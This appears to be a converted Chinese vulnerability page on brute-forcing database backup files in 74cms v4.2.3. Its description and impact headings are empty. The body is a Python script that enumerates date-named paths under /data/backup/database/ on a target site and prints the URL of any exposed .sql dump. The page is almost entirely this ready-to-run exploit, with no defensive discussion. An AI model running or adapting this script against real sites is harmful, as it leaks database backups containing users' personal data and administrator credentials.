<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>74cms v4.2.3 备份文件爆破</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p># -*- coding: utf-8 -*-<br />-------------------------------------------------<br />   File Name：     74cms_MysqlBak<br />   Description :<br />   Author :       CoolCat<br />   date：          2019/1/5<br />-------------------------------------------------<br />   Change Activity:<br />                   2019/1/5:<br />-------------------------------------------------<br />"""<br />__author__ = 'CoolCat'<br /><br />import requests<br /><br />def getBak(time):<br />    print("[running]:正在查询" + time + "是否存在备份")<br />    dir = time + "_1"<br />    filename = dir + "_1.sql"<br />    url = target + "//data/backup/database/" + dir +"/"+ filename<br />    session = requests.Session()<br />    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",<br />               "Upgrade-Insecure-Requests": "1",<br />               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",<br />               "Connection": "close", "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"}<br />    cookies = {"think_language": "en", "think_template": "default", "PHPSESSID": "6d86a34ec9125b2d08ebbb7630838682"}<br />    response = session.get(url=url, headers=headers, cookies=cookies)<br />    if response.status_code == 200:<br />        print(url)<br />        exit()<br /><br />if __name__ == '__main__':<br /><br />    global target<br />    target = "http://www.target.com"<br /><br />    for year in range(2017, 2020):<br />        for mouth in range(1, 13):<br />            for day in range(1, 31):<br />                time = (str(year) + str('%02d' % mouth) + str('%02d' % day))<br />                getBak(time)</p></body></html>